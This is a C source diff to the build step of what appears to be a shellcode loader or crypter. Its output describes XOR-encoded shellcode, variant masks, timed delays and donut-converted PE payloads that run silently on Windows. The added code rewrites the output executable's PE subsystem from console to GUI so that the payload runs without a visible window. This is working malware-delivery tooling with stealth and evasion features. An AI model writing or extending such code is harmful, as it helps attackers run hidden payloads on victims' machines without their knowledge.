@@ -530,12 +530,50 @@ static int DoBuild(int argc, char* argv[]) {
 
     long totalSize = selfSize + scSize + (long)sizeof(trailer);
 
+    // ================================================================
+    // Patch PE subsystem: CONSOLE -> WINDOWS (no console flash)
+    // Skip in debug mode so the console stays for diagnostic output
+    // ================================================================
+    if (!debugMode) {
+        FILE* fPatch = fopen(outPath, "r+b");
+        if (fPatch) {
+            // Read e_lfanew (PE header offset) at offset 0x3C
+            uint32_t peOffset = 0;
+            fseek(fPatch, 0x3C, SEEK_SET);
+            fread(&peOffset, sizeof(peOffset), 1, fPatch);
+
+            if (peOffset > 0 && peOffset < (uint32_t)totalSize - 0x18) {
+                // Verify PE signature
+                uint32_t peSig = 0;
+                fseek(fPatch, (long)peOffset, SEEK_SET);
+                fread(&peSig, sizeof(peSig), 1, fPatch);
+
+                if (peSig == 0x00004550) { // "PE\0\0"
+                    // Subsystem field is at optional header offset +68 (0x44)
+                    // Optional header starts at PE + 24
+                    // For PE32+ (x64): Subsystem is at PE + 24 + 68 = PE + 92
+                    long subsysOffset = (long)peOffset + 24 + 68;
+                    uint16_t subsystem = 0;
+                    fseek(fPatch, subsysOffset, SEEK_SET);
+                    fread(&subsystem, sizeof(subsystem), 1, fPatch);
+
+                    if (subsystem == 3) { // IMAGE_SUBSYSTEM_WINDOWS_CUI
+                        subsystem = 2;    // IMAGE_SUBSYSTEM_WINDOWS_GUI
+                        fseek(fPatch, subsysOffset, SEEK_SET);
+                        fwrite(&subsystem, sizeof(subsystem), 1, fPatch);
+                    }
+                }
+            }
+            fclose(fPatch);
+        }
+    }
+
     printf("\n");
     printf("  [+] Shellcode:  %ld bytes\n", scSize);
     printf("  [+] XOR key:    0x%02X\n", xorKey);
     printf("  [+] Variant:    0x%04X\n", variantMask);
     if (timerDelay > 0) printf("  [+] Delay:      %lld ms\n", timerDelay);
-    printf("  [+] Mode:       %s\n", debugMode ? "debug (console output)" : "release (silent)");
+    printf("  [+] Mode:       %s\n", debugMode ? "debug (console output)" : "release (silent, no console window)");
     if (isPE) printf("  [+] PE type:    %s\n", isNET ? ".NET (CLR bootstrap via donut)" : "Native (converted via donut)");
     printf("  [+] Output:     %s (%ld bytes)\n", outPath, totalSize);
     printf("  [+] No VC runtime needed -- runs on clean Windows 10/11\n\n");
